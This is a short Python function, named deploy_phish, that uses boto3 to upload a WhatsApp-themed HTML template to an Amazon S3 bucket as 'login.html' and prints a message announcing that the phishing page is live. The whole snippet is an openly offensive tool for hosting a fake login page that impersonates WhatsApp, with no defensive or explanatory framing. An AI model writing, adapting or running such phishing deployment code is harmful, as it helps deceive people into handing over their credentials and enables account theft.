import boto3  

def deploy_phish():  
    s3 = boto3.client('s3', region_name='eu-west-1')  
    s3.upload_file("templates/whatsapp.html", "your-bucket", "login.html")  
    print("[+] Phishing page live: https://your-bucket.s3.eu-west-1.amazonaws.com/login.html")  
